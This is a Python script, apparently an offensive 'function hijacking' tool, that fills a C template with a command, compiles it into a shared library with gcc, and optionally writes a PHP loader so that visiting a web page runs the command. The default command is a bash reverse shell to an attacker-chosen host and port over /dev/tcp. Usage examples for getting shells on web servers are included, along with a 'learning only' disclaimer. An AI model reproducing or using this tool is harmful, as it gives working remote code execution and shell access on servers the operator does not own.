#!/usr/bin/python3
# @Мартин.
import textwrap,argparse,threading,sys,socket,os

version = "@Мартин. Function hijacking Tool V1.0.0"
Title='''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is only for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Logo=f'''
 __       __            __           
/  \     /  |          /  |          
$$  \   /$$ |  ______  $$ |  ______  
$$$  \ /$$$ | /      \ $$ | /      \ 
$$$$  /$$$$ |/$$$$$$  |$$ |/$$$$$$  |
$$ $$ $$/$$ |$$ |  $$ |$$ |$$    $$ |
$$ |$$$/ $$ |$$ \__$$ |$$ |$$$$$$$$/ 
$$ | $/  $$ |$$    $$/ $$ |$$       |
$$/      $$/  $$$$$$/  $$/  $$$$$$$/ 
                          {version}                                                                                                       
'''
def Get_LoackHost():
    if socket.gethostbyname(socket.gethostname()).startswith('127'):
        return os.popen("ifconfig eth0 | awk -F \"[^0-9.]+\" 'NR==2{print $2}'").read().strip()
    else:
        return socket.gethostbyname(socket.gethostname())

class Server():
    def __init__(self,args):
        self.Hijacking_outfile_name='./OUTPUT/Hijacking-OutputNew.c'
        self.Hijacking_srcfile_name = 'Hijacking-source.c'
        self.PHP_srcfilename= 'Main.php'
        self.PHP_outfilename = './OUTPUT/Main-OutputNew.php'	
        self.LPORT  = args.LPORT
        self.LHOST = args.LHOST
        self.WEB = args.WEB
        self.CMD = args.CMD or f"bash -c 'bash -i >& /dev/tcp/{self.LHOST}/{self.LPORT} 0>&1'"

    def run(self ):
        if self.LHOST in self.CMD and str(self.LPORT) in self.CMD:
            print(f"[+]The reverse shell will be generated in {self.LHOST}:{self.LPORT}\n[+]commands:{self.CMD}")
        else:
            print(f"[+]In the hijacking function, you will execute the following\n[+]commands :{self.CMD}")
        File_Data = self.Read_File(self.Hijacking_srcfile_name,'r').replace("@CMD",self.CMD)
        self.Read_File(self.Hijacking_outfile_name, 'w',File_Data)
        print(f"[+]Hijacking source file generated successfully {self.Hijacking_outfile_name}")
        SOFile_Name = self.GCC_Build()
        if self.WEB :
            File_Data = self.Read_File(self.PHP_srcfilename, 'r').replace("@PATH", f'./{SOFile_Name}')
            self.Read_File(self.PHP_outfilename, 'w', File_Data)
            print(f"[+]Successfully created PHP file {self.PHP_outfilename}")

    def Read_File(self,File_Name,Mode,Note=None):
        with open(File_Name,Mode,encoding='utf-8')as f:
            if Mode == 'r':
                Note = f.read()
            elif Mode == 'w':
                f.write(Note)
            else:
                print("[!]Parameter Error!")
        return Note
    def GCC_Build(self):
        SO_FILE=self.Hijacking_outfile_name.replace('c','so')
        Status = os.system(f"gcc -shared -fPIC {self.Hijacking_outfile_name} -o {SO_FILE}")
        if Status == 0:
            print(f"[+]Hijacking file generated successfully {SO_FILE}")
        return SO_FILE.split('/')[-1]
def main():
    print(Logo,Title)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
                Example:
                    author-Github==>https://github.com/MartinxMax
                    1. Access to a web page triggers a reverse shell
                        python3 {PY_F} -lp (Port) -lh (Local Host or TCP Tunnel Host) -web 
                    2. Visit the web address to execute the specified shell command
                        python3 {PY_F} -web -cmd whoami
                    3. Execute file trigger reverse shell
                        python3 {PY_F} -lp (Port) -lh (Local Host or TCP Tunnel Host)
                    4. Execute the specified file trigger shell command
                        python3 {PY_F} -cmd whoami
                Basic usage:
                    python3 {PY_F} -web # Specify PHP framework penetration,If you do not add web parameters, it will be hijacked by other executable functions by default
                    python3 {PY_F} -cmd # Execute the shell command and bounce a session by default
                    python3 {PY_F} -lp (Port) # Set Port default 10032 , Port of rebound shell
                    python3 {PY_F} -lh (Local Host or TCP Tunnel Host) # Set IP,IP of rebound shell
                    '''.format(PY_F=sys.argv[0]
                               )))
    parser.add_argument('-lp', '--LPORT', default=10032, help='Loacl Port or Remote Port')
    parser.add_argument('-lh', '--LHOST', default=Get_LoackHost(), help='Loacl Host or Remote Host')
    parser.add_argument('-web', '--WEB', action='store_true', help='PHP Framework')
    parser.add_argument('-cmd', '--CMD',default=None, help='Command')
    args = parser.parse_args()
    Server(args).run()

if __name__ == '__main__':
    main()